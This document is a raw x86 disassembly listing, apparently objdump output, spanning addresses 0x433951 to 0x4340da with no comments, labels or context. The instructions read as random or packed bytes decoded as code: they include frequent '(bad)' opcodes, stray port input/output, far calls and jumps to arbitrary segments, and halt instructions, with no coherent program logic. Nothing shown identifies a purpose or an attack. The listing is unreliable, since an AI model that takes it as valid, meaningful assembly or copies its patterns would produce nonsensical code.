  433951:	and    ah,BYTE PTR [edi-0x42a03356]
  433957:	mov    ds:0x7436b78e,al
  43395c:	xchg   ebx,eax
  43395d:	je     0x4339cc
  43395f:	push   0x73039b0
  433964:	xchg   dh,dh
  433966:	call   0x7780:0x99102953
  43396d:	add    ch,BYTE PTR [esi]
  43396f:	mov    BYTE PTR [edx-0x1682ff80],cl
  433975:	sbb    BYTE PTR [edi],cl
  433977:	add    BYTE PTR [eax-0x46fbd5bd],cl
  43397d:	mov    esp,0x2c7b277
  433982:	dec    esp
  433983:	sub    eax,0xaa30a1a0
  433988:	cwde   
  433989:	mov    eax,ds:0xab74671f
  43398e:	adc    al,0x4e
  433990:	into   
  433991:	stos   DWORD PTR es:[edi],eax
  433992:	cdq    
  433993:	aad    0x72
  433995:	in     al,dx
  433996:	or     al,dh
  433998:	push   ds
  433999:	dec    ebp
  43399a:	ss pop edx
  43399c:	cmc    
  43399d:	aad    0x6f
  43399f:	aam    0xa7
  4339a1:	mov    edx,0x9e06c4f7
  4339a6:	pop    eax
  4339a7:	aad    0x4d
  4339a9:	mul    ecx
  4339ab:	aas    
  4339ac:	pop    ss
  4339ad:	sbb    al,0xb4
  4339af:	scas   al,BYTE PTR es:[edi]
  4339b0:	jns    0x4339b2
  4339b2:	push   edi
  4339b3:	test   DWORD PTR [ecx+0x64],ebx
  4339b6:	lahf   
  4339b7:	or     esp,0x6d1b2807
  4339bd:	add    dl,dh
  4339bf:	hlt    
  4339c0:	adc    ecx,DWORD PTR [ebp+ecx*1+0x60a96114]
  4339c7:	xchg   ebp,eax
  4339c8:	jnp    0x433a1e
  4339ca:	in     eax,dx
  4339cb:	frstor [esi-0x3b2bf8e4]
  4339d1:	mov    bh,0xe1
  4339d3:	xor    dh,dh
  4339d5:	sub    ecx,esp
  4339d7:	mov    al,ds:0x9ff60789
  4339dc:	dec    ebp
  4339dd:	in     eax,dx
  4339de:	pop    ebx
  4339df:	inc    ebx
  4339e0:	imul   eax,DWORD PTR [ebx],0xffffff9c
  4339e3:	xor    al,0xd3
  4339e5:	or     edi,DWORD PTR [ebx+0x60beca1d]
  4339eb:	inc    ebx
  4339ec:	daa    
  4339ed:	outs   dx,BYTE PTR ds:[esi]
  4339ee:	inc    ebp
  4339ef:	jecxz  0x433a5c
  4339f1:	jl     0x433a2b
  4339f3:	pop    eax
  4339f4:	mov    ah,0xdf
  4339f6:	outs   dx,BYTE PTR ds:[esi]
  4339f7:	push   ss
  4339f8:	lods   al,BYTE PTR ds:[esi]
  4339f9:	and    eax,0x2fc3f5dd
  4339fe:	xchg   esp,eax
  4339ff:	pop    ecx
  433a00:	mov    ebp,ecx
  433a02:	jb     0x433a1a
  433a04:	or     eax,0x3af2fabb
  433a09:	es stos BYTE PTR es:[edi],al
  433a0b:	scas   al,BYTE PTR es:[edi]
  433a0c:	pop    ebp
  433a0d:	outs   dx,BYTE PTR ds:[esi]
  433a0e:	sub    eax,0x322272d7
  433a13:	rol    DWORD PTR [eax],cl
  433a15:	mov    dl,0x90
  433a17:	inc    eax
  433a18:	mov    dh,0x8b
  433a1a:	fcmovne st,st(7)
  433a1c:	or     BYTE PTR [eax+0x650eaf94],dl
  433a22:	dec    ecx
  433a23:	aam    0x94
  433a25:	push   cs
  433a26:	dec    ebp
  433a27:	fiadd  WORD PTR [edi+edx*1-0x54770aad]
  433a2e:	jg     0x4339c5
  433a30:	aas    
  433a31:	pop    eax
  433a32:	sub    dl,al
  433a34:	adc    eax,0x7fa92402
  433a39:	rol    DWORD PTR ds:0x6418cfde,1
  433a3f:	mov    ch,0x50
  433a41:	arpl   WORD PTR [edi+0x63],cx
  433a44:	lds    esi,FWORD PTR ds:0xded1b9af
  433a4a:	mov    dl,0xc5
  433a4c:	sub    al,0x3
  433a4e:	sbb    al,0xce
  433a50:	xlat   BYTE PTR ds:[ebx]
  433a51:	retf   0xdf27
  433a54:	in     eax,dx
  433a55:	adc    BYTE PTR [edx-0x4efd8511],bl
  433a5b:	(bad)  
  433a5c:	lahf   
  433a5d:	cdq    
  433a5e:	cmp    dh,BYTE PTR [ecx-0x60f9fd5d]
  433a64:	(bad)  
  433a65:	fdiv   QWORD PTR [eax+0x6293d3c2]
  433a6b:	gs push ecx
  433a6d:	leave  
  433a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433a6f:	mov    esi,0xf2e66e2f
  433a74:	std    
  433a75:	dec    edx
  433a76:	mov    WORD PTR [edx+ebp*4+0x2],ss
  433a7a:	mov    eax,0x3367cf26
  433a7f:	loop   0x433a0f
  433a81:	lahf   
  433a82:	and    BYTE PTR [edx+eax*1-0x7784b263],dh
  433a89:	shl    bl,1
  433a8b:	or     BYTE PTR [esi+0x4e191c02],bh
  433a91:	mov    edi,DWORD PTR [ecx-0x3d]
  433a94:	aaa    
  433a95:	dec    esi
  433a96:	ins    DWORD PTR es:[edi],dx
  433a97:	xchg   DWORD PTR [esi-0x7c1541f3],eax
  433a9d:	adc    eax,0xbd88a0ae
  433aa2:	adc    bh,bl
  433aa4:	mov    ds,edx
  433aa6:	fcomp  QWORD PTR [ebx-0x77]
  433aa9:	and    ebx,esi
  433aab:	sbb    cl,bl
  433aad:	adc    ecx,eax
  433aaf:	xor    al,0x5c
  433ab1:	add    ecx,DWORD PTR [ecx+ebx*8]
  433ab4:	cmovae ecx,DWORD PTR [ebx+0x60e2e99d]
  433abb:	test   eax,0x46dfefb1
  433ac0:	fsubr  QWORD PTR [ebx-0x4c1328cb]
  433ac6:	push   0x61
  433ac8:	jmp    0x714cd6ee
  433acd:	sbb    al,0x75
  433acf:	fbld   TBYTE PTR [esi]
  433ad1:	push   edi
  433ad2:	addr16 aad 0x61
  433ad5:	or     BYTE PTR cs:[ebp+0x7f],ah
  433ad9:	xor    al,0x16
  433adb:	mul    edi
  433add:	add    dl,BYTE PTR [edx+0x3c]
  433ae0:	retf   
  433ae1:	cmp    bh,bl
  433ae3:	lock mov DWORD PTR [edi+0x3b],ebx
  433ae7:	(bad)  
  433ae8:	popf   
  433ae9:	xor    al,0x94
  433aeb:	retf   0x55f0
  433aee:	adc    ch,BYTE PTR [esi-0x43]
  433af1:	add    cl,BYTE PTR [edx+0x38]
  433af4:	popa   
  433af5:	mov    ds:0x342c9a5a,al
  433afa:	pop    ds
  433afb:	test   eax,0x58262918
  433b00:	lock scas al,BYTE PTR es:[edi]
  433b02:	pop    ds
  433b03:	call   0x6d73:0x5744dee2
  433b0a:	out    dx,eax
  433b0b:	pop    edi
  433b0c:	xchg   ebx,eax
  433b0d:	mov    edx,0x7fff2ee
  433b12:	imul   edx,ebp,0xffffffe9
  433b15:	jl     0x433aaa
  433b17:	adc    bl,BYTE PTR [esi-0x5a]
  433b1a:	mov    edx,0xea5041d4
  433b1f:	add    al,0x2c
  433b21:	pusha  
  433b22:	out    dx,eax
  433b23:	lock jl 0x433aaa
  433b26:	gs imul esi,ecx,0xffffff9d
  433b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433b2b:	les    eax,FWORD PTR [ebx-0x6e]
  433b2e:	ror    BYTE PTR [esi+0x7b602b7],0x8f
  433b35:	cld    
  433b36:	or     DWORD PTR [eax],0xbb6d85a2
  433b3c:	aam    0x9
  433b3e:	add    DWORD PTR [ecx+0x29],edi
  433b41:	xor    al,0xf9
  433b43:	shr    BYTE PTR [ebx+0x2],0xbc
  433b47:	add    eax,0xa4eb7dd9
  433b4c:	push   ebx
  433b4d:	in     eax,dx
  433b4e:	jnp    0x433b8d
  433b50:	sbb    dl,0xc1
  433b53:	xchg   ebp,eax
  433b54:	mov    eax,ds:0xba608fc2
  433b59:	add    cl,dl
  433b5b:	dec    ebx
  433b5c:	add    al,0xb2
  433b5e:	pushf  
  433b5f:	inc    edx
  433b60:	in     eax,dx
  433b61:	(bad)  
  433b62:	pusha  
  433b63:	mov    ebx,DWORD PTR [edx]
  433b65:	js     0x433bd8
  433b67:	loopne 0x433b3c
  433b69:	push   ebx
  433b6a:	in     al,0xcb
  433b6c:	cmp    al,BYTE PTR [ebx]
  433b6e:	in     al,dx
  433b6f:	dec    ebp
  433b70:	sti    
  433b71:	popa   
  433b72:	jbe    0x433b52
  433b74:	out    dx,eax
  433b75:	je     0x433b96
  433b77:	out    dx,eax
  433b78:	iret   
  433b79:	jmp    0x8884c26e
  433b7e:	xor    bl,0x13
  433b81:	add    cl,dh
  433b83:	xchg   edi,eax
  433b84:	stos   DWORD PTR es:[edi],eax
  433b85:	sbb    al,0xc7
  433b87:	and    dl,0x9d
  433b8a:	pusha  
  433b8b:	inc    ebp
  433b8c:	xor    eax,DWORD PTR [ecx+0x14]
  433b8f:	fild   WORD PTR [edx+0x5d]
  433b92:	cli    
  433b93:	aad    0xd
  433b95:	mov    dh,BYTE PTR [ecx-0x76]
  433b98:	imul   esi,DWORD PTR [edi+0x5c],0xffffffb1
  433b9c:	mov    ch,cl
  433b9e:	mov    edx,0x4428e88b
  433ba3:	adc    DWORD PTR [edi+0x1d],ecx
  433ba6:	xor    al,0x6c
  433ba8:	(bad)  
  433ba9:	call   0xa93c9eb8
  433bae:	and    ecx,ecx
  433bb0:	icebp  
  433bb1:	and    edx,DWORD PTR [ebx+edx*8+0x38]
  433bb5:	daa    
  433bb6:	rcl    BYTE PTR [edi-0x3beb52a8],0xdc
  433bbd:	add    al,0xa
  433bbf:	xlat   BYTE PTR ds:[ebx]
  433bc0:	mov    al,ds:0xe9e65546
  433bc5:	(bad)  
  433bc6:	(bad)  
  433bc7:	adc    BYTE PTR [ecx-0x5814d149],cl
  433bcd:	hlt    
  433bce:	mov    eax,ds:0x202ccf5
  433bd3:	scas   eax,DWORD PTR es:[edi]
  433bd4:	enter  0x8161,0xa1
  433bd8:	scas   al,BYTE PTR es:[edi]
  433bd9:	imul   ebx,DWORD PTR [esi],0xffffff8f
  433bdc:	cmp    eax,0x5c3f19e5
  433be1:	cs aad 0xae
  433be4:	outs   dx,BYTE PTR ds:[esi]
  433be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433be6:	neg    DWORD PTR [esi+0x4a]
  433be9:	add    BYTE PTR [edx+0x70],0xe0
  433bed:	jg     0x433c0d
  433bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433bf0:	imul   edx,DWORD PTR [ebp-0x57],0xffffff90
  433bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433bf5:	sahf   
  433bf6:	rcr    DWORD PTR [ecx-0x30],1
  433bf9:	test   BYTE PTR [edi],bl
  433bfb:	lahf   
  433bfc:	cwde   
  433bfd:	je     0x433c24
  433bff:	arpl   bx,sp
  433c01:	xor    ebx,DWORD PTR [edi]
  433c03:	mov    bl,0x30
  433c05:	mov    ebx,0x31ce4010
  433c0a:	push   0x1d65aaab
  433c0f:	add    eax,0xf7e74357
  433c14:	sbb    DWORD PTR [ebp+0x1f],ebp
  433c17:	cdq    
  433c18:	pop    esi
  433c19:	loope  0x433c03
  433c1b:	cld    
  433c1c:	push   ds
  433c1d:	mov    ah,BYTE PTR [edi-0x61]
  433c20:	shl    BYTE PTR [eax],1
  433c22:	push   edx
  433c23:	jne    0x433c8e
  433c25:	and    al,0xb3
  433c27:	xor    al,0x89
  433c29:	push   ebx
  433c2a:	mov    ch,0xf8
  433c2c:	sbb    ch,BYTE PTR [ebx]
  433c2e:	xlat   BYTE PTR ds:[ebx]
  433c2f:	jmp    0x433c27
  433c31:	add    eax,0x29e0dc84
  433c36:	arpl   WORD PTR [ecx+0x7500a709],cx
  433c3c:	mov    bl,ch
  433c3e:	test   BYTE PTR [ebp+edi*8+0x725c53d4],al
  433c45:	add    al,0x7
  433c47:	aam    0x9c
  433c49:	cmp    al,0x26
  433c4b:	xchg   ebp,eax
  433c4c:	arpl   WORD PTR [esp+eiz*8-0x35],dx
  433c50:	mov    DWORD PTR [edi+0x3d48fe4c],esp
  433c56:	stos   DWORD PTR es:[edi],eax
  433c57:	adc    bl,BYTE PTR [ecx+0x3]
  433c5a:	loopne 0x433c55
  433c5c:	in     al,dx
  433c5d:	jnp    0x433bdf
  433c5f:	inc    esi
  433c60:	lock adc DWORD PTR [ebp+ecx*2+0x15],ebx
  433c65:	sbb    al,0x1e
  433c67:	test   al,0xde
  433c69:	icebp  
  433c6a:	dec    esi
  433c6b:	test   DWORD PTR [edx],0x388961e3
  433c71:	cmp    BYTE PTR [esp+edx*8],cl
  433c74:	out    0xd8,eax
  433c76:	xchg   ebx,eax
  433c77:	lds    edx,FWORD PTR [edx]
  433c79:	les    esp,FWORD PTR [eax-0x35]
  433c7c:	ss fs rol ch,1
  433c80:	imul   BYTE PTR [eax-0x5f942b76]
  433c86:	push   ebx
  433c87:	ins    DWORD PTR es:[edi],dx
  433c88:	pop    es
  433c89:	pop    es
  433c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433c8b:	sub    cl,BYTE PTR [ecx+0x40a2cde7]
  433c91:	adc    eax,0xd9d63277
  433c96:	cld    
  433c97:	aam    0x9c
  433c99:	push   cs
  433c9a:	push   eax
  433c9b:	fcmovnb st,st(6)
  433c9d:	lea    ebx,[edx+ecx*8]
  433ca0:	mov    al,cl
  433ca2:	mov    cl,0xd2
  433ca4:	push   ecx
  433ca5:	dec    esi
  433ca6:	test   al,cl
  433ca8:	hlt    
  433ca9:	lds    esi,FWORD PTR [edx-0x2128779b]
  433caf:	xchg   DWORD PTR [esi+esi*2],eax
  433cb2:	inc    esp
  433cb3:	popf   
  433cb4:	stos   DWORD PTR es:[edi],eax
  433cb5:	sbb    al,0x84
  433cb7:	aaa    
  433cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433cb9:	mov    edx,0x4ef958f0
  433cbe:	mov    edx,0x6c83881c
  433cc3:	test   DWORD PTR [esi],esp
  433cc5:	pop    esp
  433cc6:	pop    edi
  433cc7:	out    0xad,al
  433cc9:	lea    edx,[ebp-0x59]
  433ccc:	mov    BYTE PTR [ecx+eax*1+0x74],cl
  433cd0:	and    bl,BYTE PTR [ebp+0x24]
  433cd3:	mov    al,ds:0x1f38f78b
  433cd8:	bound  eax,QWORD PTR [ebx-0x16]
  433cdb:	pop    ebx
  433cdc:	xor    ch,dl
  433cde:	pop    eax
  433cdf:	jne    0x433cd4
  433ce1:	sbb    al,0xdc
  433ce3:	or     al,ah
  433ce5:	call   0x6b3f:0x1af927fd
  433cec:	mov    al,cl
  433cee:	adc    bh,ah
  433cf0:	mov    bl,BYTE PTR [ebx+0x1]
  433cf3:	jne    0x433d35
  433cf5:	(bad)
  433cf9:	outs   dx,DWORD PTR ds:[esi]
  433cfa:	and    eax,DWORD PTR [edx]
  433cfc:	cwde   
  433cfd:	ret    0xcf46
  433d00:	mov    BYTE PTR [ebx-0x7f],al
  433d03:	imul   ebp,DWORD PTR [ebp-0x126783f0],0x9e19c405
  433d0d:	int    0x10
  433d0f:	pop    es
  433d10:	(bad)
  433d13:	outs   dx,DWORD PTR ds:[esi]
  433d14:	adc    DWORD PTR [edx+0xe697790],0x359f679
  433d1e:	cmp    bh,bl
  433d20:	fwait
  433d21:	lahf   
  433d22:	mov    esp,0x609a3731
  433d27:	icebp  
  433d28:	fmulp  st(5),st
  433d2a:	pop    edx
  433d2b:	leave  
  433d2c:	push   esi
  433d2d:	xor    ah,BYTE PTR [edi+0x6c77c1d4]
  433d33:	or     al,BYTE PTR [esp+edx*2+0x2f8891d8]
  433d3a:	retf   
  433d3b:	mov    edi,0xe47f64f1
  433d40:	and    DWORD PTR [ebx],eax
  433d42:	jb     0x433d40
  433d44:	retf   
  433d45:	or     DWORD PTR [esi+0x1e48cac6],edx
  433d4b:	jns    0x433dc1
  433d4d:	jp     0x433d4d
  433d4f:	shl    dh,cl
  433d51:	mov    dl,0x20
  433d53:	xlat   BYTE PTR ds:[ebx]
  433d54:	mov    cl,0x90
  433d56:	mov    cl,0x93
  433d58:	cmp    esi,eax
  433d5a:	mov    al,ds:0x196d95a2
  433d5f:	cmc    
  433d60:	cmp    esp,esi
  433d62:	cli    
  433d63:	xchg   ebp,eax
  433d64:	idiv   BYTE PTR ds:0x27faec9
  433d6a:	fcomp  DWORD PTR [esp+eiz*8-0x27]
  433d6e:	dec    ebx
  433d6f:	(bad)
  433d72:	push   ds
  433d73:	out    0x23,eax
  433d75:	les    eax,FWORD PTR [edi+esi*1]
  433d78:	or     cl,BYTE PTR [edx+eax*2+0x61abc0d5]
  433d7f:	add    DWORD PTR [esi-0x763f1d1e],ebx
  433d85:	jmp    0x433df2
  433d87:	xchg   esi,eax
  433d88:	adc    BYTE PTR [edi+0x7],bl
  433d8b:	out    dx,eax
  433d8c:	stos   BYTE PTR es:[edi],al
  433d8d:	add    eax,0xd1854012
  433d92:	sti    
  433d93:	ins    DWORD PTR es:[edi],dx
  433d94:	inc    edx
  433d95:	test   BYTE PTR [eax+0x21],ah
  433d98:	pusha  
  433d99:	and    ah,BYTE PTR [ebx+0x3f6fd435]
  433d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433da0:	and    eax,0x2a165470
  433da5:	popa   
  433da6:	dec    eax
  433da7:	mov    edx,ds
  433da9:	lds    ebx,FWORD PTR [ebx-0x2a327dc2]
  433daf:	mov    ch,0xb6
  433db1:	or     ebx,DWORD PTR [esi+0x2d]
  433db4:	or     DWORD PTR [esi],edi
  433db6:	fstp   TBYTE PTR [ebp-0x2ab56650]
  433dbc:	push   0x59
  433dbe:	jg     0x433d92
  433dc0:	jmp    0x890fa6f6
  433dc5:	aas    
  433dc6:	adc    eax,0xf14bbfc
  433dcb:	mov    al,ds:0x33801cab
  433dd0:	jle    0x433d5b
  433dd2:	or     ecx,ebx
  433dd4:	fmul   DWORD PTR [esi]
  433dd6:	sbb    DWORD PTR [ebx+0x3ecb4589],0x2
  433ddd:	sub    DWORD PTR [eax-0x651d915c],ecx
  433de3:	scas   eax,DWORD PTR es:[edi]
  433de4:	mov    dl,0xba
  433de6:	or     esp,DWORD PTR [eax+0x23a8353]
  433dec:	sbb    DWORD PTR ds:0x73ae3009,esp
  433df2:	mov    ch,0x4b
  433df4:	xchg   esi,eax
  433df5:	or     DWORD PTR ds:0xf056aed7,eax
  433dfb:	jg     0x433e2c
  433dfd:	add    esi,esp
  433dff:	dec    ecx
  433e00:	sbb    DWORD PTR ds:0x4dc2b113,0x1e
  433e07:	add    DWORD PTR [eax],edx
  433e09:	mov    ebx,0x218438e9
  433e0e:	add    eax,0xc704a9a2
  433e13:	mov    fs,WORD PTR [edx+0x3]
  433e16:	xor    DWORD PTR [ebp-0x28],0x58
  433e1a:	xor    ebx,DWORD PTR [edi-0x5320ee6d]
  433e20:	ss js  0x433e80
  433e23:	das    
  433e24:	xchg   esi,eax
  433e25:	add    eax,0x200c0c6c
  433e2a:	mov    ebx,0x14a18826
  433e2f:	data16 mov al,0xbc
  433e32:	push   edx
  433e33:	pop    ecx
  433e34:	sahf   
  433e35:	mov    esp,DWORD PTR [ecx+0x3d]
  433e38:	mov    ds,WORD PTR [ecx-0x431d279c]
  433e3e:	dec    edi
  433e3f:	pop    esp
  433e40:	(bad)  
  433e41:	test   al,0x1f
  433e43:	jne    0x433e10
  433e45:	(bad)  
  433e47:	loope  0x433e89
  433e49:	sahf   
  433e4a:	pop    eax
  433e4b:	aam    0x5e
  433e4d:	leave  
  433e4e:	or     BYTE PTR [ebx+0x1832d5d2],al
  433e54:	mov    DWORD PTR [ecx-0x1a],ecx
  433e57:	test   ah,bh
  433e59:	repnz add dl,BYTE PTR [ebx+0x38]
  433e5d:	fs jmp 0x1854:0xad9482e3
  433e65:	xchg   edx,eax
  433e66:	int3   
  433e67:	fimul  WORD PTR [ecx-0x644c042d]
  433e6d:	jmp    0x52f6:0x5f98421
  433e74:	inc    ecx
  433e75:	fldpi  
  433e77:	sub    bh,cl
  433e79:	call   0xfd7fb9d
  433e7e:	ja     0x433e8f
  433e80:	push   ebp
  433e81:	call   0x1da0:0x17aadd06
  433e88:	and    BYTE PTR [edi+edx*4+0x3b],0x88
  433e8d:	mov    ch,0xc6
  433e8f:	loop   0x433ebd
  433e91:	mov    cl,0x5
  433e93:	xor    dh,0xb5
  433e96:	xchg   ebp,eax
  433e97:	aam    0xee
  433e99:	push   esi
  433e9a:	dec    ecx
  433e9b:	inc    ebp
  433e9c:	outs   dx,BYTE PTR ds:[esi]
  433e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433e9e:	aam    0xd4
  433ea0:	jmp    0x433e49
  433ea2:	fist   WORD PTR [edx+0x29]
  433ea5:	mov    al,BYTE PTR [esi+0x14]
  433ea8:	dec    eax
  433ea9:	sub    edi,DWORD PTR [edx]
  433eab:	sbb    DWORD PTR [eax-0x9f397f9],ecx
  433eb1:	and    al,0x2d
  433eb3:	fwait
  433eb4:	add    eax,DWORD PTR [ebx]
  433eb6:	call   0x2b0f7c40
  433ebb:	sbb    dl,BYTE PTR [ebp+0x1c115bec]
  433ec1:	daa    
  433ec2:	sahf   
  433ec3:	pop    ebp
  433ec4:	mov    esp,0xac9a94b5
  433ec9:	pop    ds
  433eca:	cld    
  433ecb:	push   ebp
  433ecc:	adc    eax,0x89aaeb00
  433ed1:	cmp    ah,ah
  433ed3:	lods   eax,DWORD PTR ds:[esi]
  433ed4:	mov    ch,al
  433ed6:	call   0xaef7439f
  433edb:	hlt    
  433edc:	lods   eax,DWORD PTR ds:[esi]
  433edd:	add    dh,dl
  433edf:	addr16 xchg ecx,eax
  433ee1:	pop    edx
  433ee2:	ror    BYTE PTR [ecx],1
  433ee4:	pop    edx
  433ee5:	es pop ds
  433ee7:	xor    DWORD PTR [ebp-0xb3b33f3],esi
  433eed:	xor    eax,0x146dd4a9
  433ef2:	mov    ds:0x6a1e4f21,al
  433ef7:	sub    al,0x89
  433ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433efa:	mov    bh,BYTE PTR [edi-0x1328bd80]
  433f00:	jg     0x433f04
  433f02:	inc    edx
  433f03:	xor    ah,al
  433f05:	test   eax,0xad5ef246
  433f0a:	pusha  
  433f0b:	sbb    esp,ebp
  433f0d:	ins    BYTE PTR es:[edi],dx
  433f0e:	test   BYTE PTR [ebp+0x5a],0x1c
  433f12:	fcmovbe st,st(2)
  433f14:	inc    edi
  433f15:	pop    ebx
  433f16:	sub    eax,0x98849884
  433f1b:	push   esp
  433f1c:	mov    ebp,DWORD PTR [edi]
  433f1e:	arpl   WORD PTR [ebx],dx
  433f20:	xchg   esi,eax
  433f21:	(bad)  
  433f22:	fist   WORD PTR [edx+0x3abec29c]
  433f28:	adc    eax,0x6b40e6b5
  433f2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433f2e:	jno    0x433f5b
  433f30:	lahf   
  433f31:	jecxz  0x433f93
  433f33:	stc    
  433f34:	and    DWORD PTR [eax+0x56782fd5],ebp
  433f3a:	push   ds
  433f3b:	jmp    0x581cb0e0
  433f40:	xchg   esp,eax
  433f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433f42:	into   
  433f43:	aad    0x2d
  433f45:	stc    
  433f46:	mov    ds,WORD PTR [edx+0x75]
  433f49:	aam    0x2b
  433f4b:	test   al,0x8d
  433f4d:	push   ecx
  433f4e:	mov    eax,0x764fd746
  433f53:	adc    al,0x20
  433f55:	add    al,0x88
  433f57:	aam    0x17
  433f59:	add    al,0xa5
  433f5b:	jb     0x433f55
  433f5d:	inc    ebp
  433f5e:	mov    esi,0xb037bae
  433f63:	fucomip st,st(2)
  433f65:	and    DWORD PTR [edi-0x1f],ebp
  433f68:	xor    DWORD PTR [ebx-0x16],ebp
  433f6b:	in     eax,0x73
  433f6d:	add    dh,BYTE PTR [esi]
  433f6f:	bound  edi,QWORD PTR [ebx]
  433f71:	inc    ebx
  433f72:	mov    bh,0x57
  433f74:	mov    BYTE PTR [ebp-0x4f],cl
  433f77:	out    dx,al
  433f78:	or     edx,ebp
  433f7a:	(bad)  
  433f7b:	inc    ebp
  433f7c:	stos   DWORD PTR es:[edi],eax
  433f7d:	fisubr DWORD PTR [eax]
  433f7f:	mov    bh,0x77
  433f81:	mov    bl,0x9d
  433f83:	repnz mov ebx,eax
  433f86:	inc    cx
  433f88:	pop    ebp
  433f89:	sbb    bl,al
  433f8b:	outs   dx,BYTE PTR ds:[esi]
  433f8c:	xchg   ebp,eax
  433f8d:	lea    esi,[ecx]
  433f8f:	in     eax,0x15
  433f91:	inc    ebx
  433f92:	repz aam 0xf4
  433f95:	(bad)  
  433f96:	retf   
  433f97:	aam    0xb0
  433f99:	fdiv   QWORD PTR [ecx]
  433f9b:	fsubr  QWORD PTR [edi+0x5c]
  433f9e:	outs   dx,BYTE PTR ds:[esi]
  433f9f:	pop    esi
  433fa0:	pushf  
  433fa1:	pop    ds
  433fa2:	scas   al,BYTE PTR es:[edi]
  433fa3:	ret    
  433fa4:	xlat   BYTE PTR ds:[ebx]
  433fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433fa6:	jl     0x433f83
  433fa8:	add    al,0x3
  433faa:	aad    0x71
  433fac:	ret    0xbb31
  433faf:	cdq    
  433fb0:	mov    ah,0x4d
  433fb2:	xor    eax,0x5cee0c54
  433fb7:	or     eax,DWORD PTR es:[ebx+0x2]
  433fbb:	ror    DWORD PTR [eax-0x6b8ce9f],0x4d
  433fc2:	sub    cl,BYTE PTR [ecx]
  433fc4:	jl     0x433fc8
  433fc6:	lock (bad) 
  433fc8:	push   edx
  433fc9:	add    bl,BYTE PTR ds:0x2e5cb95e
  433fcf:	jae    0x433f59
  433fd1:	xchg   edi,eax
  433fd2:	xor    eax,esi
  433fd4:	popf   
  433fd5:	xchg   ecx,eax
  433fd6:	jne    0x433fb6
  433fd8:	(bad)  
  433fd9:	sbb    ah,ah
  433fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433fdc:	or     cl,dl
  433fde:	mov    eax,ds:0x7fb01e54
  433fe3:	xlat   BYTE PTR ds:[ebx]
  433fe4:	pop    ebp
  433fe5:	outs   dx,DWORD PTR ds:[esi]
  433fe6:	pop    ds
  433fe7:	add    DWORD PTR [eax],0x3f
  433fea:	or     eax,0xfb2b903c
  433fef:	lods   al,BYTE PTR ds:[esi]
  433ff0:	mov    esp,0xc84b8232
  433ff5:	test   DWORD PTR [ebp+eiz*2+0x4c],ebp
  433ff9:	jmp    0x5416171d
  433ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433fff:	xchg   DWORD PTR [ebx+eiz*1-0x7a82b6b],esi
  434006:	cli    
  434007:	or     DWORD PTR [edi-0x7673960b],0x7d
  43400e:	gs dec esp
  434010:	stos   BYTE PTR es:[edi],al
  434011:	jae    0x434003
  434013:	inc    edi
  434014:	loop   0x43402d
  434016:	(bad)  
  434017:	jmp    0x75f23652
  43401c:	dec    esp
  43401d:	cld    
  43401e:	mov    ebp,0x7049afb3
  434023:	ins    DWORD PTR es:[edi],dx
  434024:	cmc    
  434025:	add    bh,dh
  434027:	and    ah,cl
  434029:	push   ebp
  43402a:	ret    0x979b
  43402d:	rcl    DWORD PTR [ebx+eax*1-0x70],0x42
  434032:	push   cs
  434033:	daa    
  434034:	call   0xa798:0x50d3f63f
  43403b:	jne    0x43401a
  43403d:	add    bh,BYTE PTR [edi]
  43403f:	test   DWORD PTR [eax-0x375c997b],ebx
  434045:	push   es
  434046:	fcmovnb st,st(4)
  434048:	and    eax,0x6ef5b2d3
  43404d:	add    eax,DWORD PTR [esi-0x37]
  434050:	sub    BYTE PTR [edx+0x3],ch
  434053:	test   DWORD PTR [ecx-0x29b6e01a],ecx
  434059:	cmp    bl,BYTE PTR [ecx]
  43405b:	and    al,0x42
  43405d:	and    dh,BYTE PTR [esp+edx*8-0x2b]
  434061:	or     esi,DWORD PTR [eax]
  434063:	or     esp,DWORD PTR [eax]
  434065:	xchg   ebp,eax
  434066:	nop
  434067:	jns    0x434061
  434069:	dec    eax
  43406a:	pop    ds
  43406b:	sti    
  43406c:	mov    eax,ds:0xd8194dbc
  434071:	inc    ebx
  434072:	jp     0x434046
  434074:	or     eax,0x5b5f4b8b
  434079:	inc    edi
  43407a:	mov    ss,eax
  43407c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43407d:	fcomp  DWORD PTR [edi]
  43407f:	mov    eax,ds:0x8fd5f955
  434084:	push   ss
  434085:	loope  0x43408c
  434087:	mov    BYTE PTR [eax+0x35],dh
  43408a:	push   esp
  43408b:	aam    0x97
  43408d:	fsubr  QWORD PTR [edi]
  43408f:	or     al,0x9c
  434091:	mov    ebx,0xd94b41c
  434096:	or     eax,0xb3c5d34d
  43409b:	sub    esi,eax
  43409d:	adc    eax,0x36cc4da
  4340a2:	(bad)  
  4340a3:	mov    esp,ebp
  4340a5:	mov    ss,WORD PTR [ebx]
  4340a7:	ins    DWORD PTR es:[edi],dx
  4340a8:	test   DWORD PTR ds:0xc189dd23,esp
  4340ae:	idiv   BYTE PTR ds:0x548f7c9
  4340b4:	xor    BYTE PTR [ebx],al
  4340b6:	cmp    cl,BYTE PTR [ecx]
  4340b8:	scas   eax,DWORD PTR es:[edi]
  4340b9:	js     0x434046
  4340bb:	add    BYTE PTR [edi+0x2f],0x1f
  4340bf:	jno    0x4340db
  4340c1:	push   ecx
  4340c2:	fmulp  st(0),st
  4340c4:	dec    di
  4340c6:	mov    ecx,0x463613d5
  4340cb:	or     al,BYTE PTR [edx+0x52]
  4340ce:	call   0x570ccb8
  4340d3:	or     esi,DWORD PTR [edx-0x72]
  4340d6:	dec    esp
  4340d7:	ins    BYTE PTR es:[edi],dx
  4340d8:	xor    bh,bl
  4340da:	hlt    
